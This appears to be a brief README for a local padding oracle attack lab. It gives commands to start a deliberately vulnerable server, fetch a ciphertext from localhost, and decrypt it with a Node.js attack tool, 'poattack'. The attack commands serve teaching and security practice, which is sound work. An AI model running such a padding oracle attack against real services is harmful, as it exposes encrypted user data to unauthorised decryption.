# Padding Oracle Attack Lab

**Run Vulnrable HTTP Server**

$ `python3 app.py 8000`

**Attack Using Nodejs Tool**

*get the ciphertext*

$ `curl localhost:8000/?action=encrypt`

*use the tool to attack*

$ `poattack decrypt 'http://localhost:8000/?action=process&cipher=' hex:9693699cd2a2ecd52dbe61a7f1daa2d8b7f01937fdc11b19be1df88bd895484e7c5c6a83fdd8107a85330cda4dc68d8997b583338162762dcda7fd14d53b224e8a42d6abfac90aed816d433e3d1d5cd3 16 500`
